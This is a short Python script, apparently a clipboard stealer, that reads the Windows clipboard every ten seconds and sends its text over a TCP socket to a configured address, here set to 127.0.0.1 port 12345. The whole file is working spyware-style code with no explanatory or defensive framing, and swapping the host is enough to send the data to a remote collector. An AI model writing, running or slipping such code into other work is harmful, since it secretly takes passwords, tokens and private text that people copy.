import win32clipboard
import schedule
import time 
import socket

ip = "127.0.0.1"
port ="12345"
dataToSent = ""

def job():

    win32clipboard.OpenClipboard()
    clipboardData = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
    dataToSentFunc(clipboardData)
    win32clipboard.CloseClipboard()
   

def dataToSentFunc(data):

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip,int(port)))
        shitto = data
        s.sendall(shitto)
        


schedule.every(10).seconds.do(job)

while 1:
    schedule.run_pending()
    time.sleep(1)

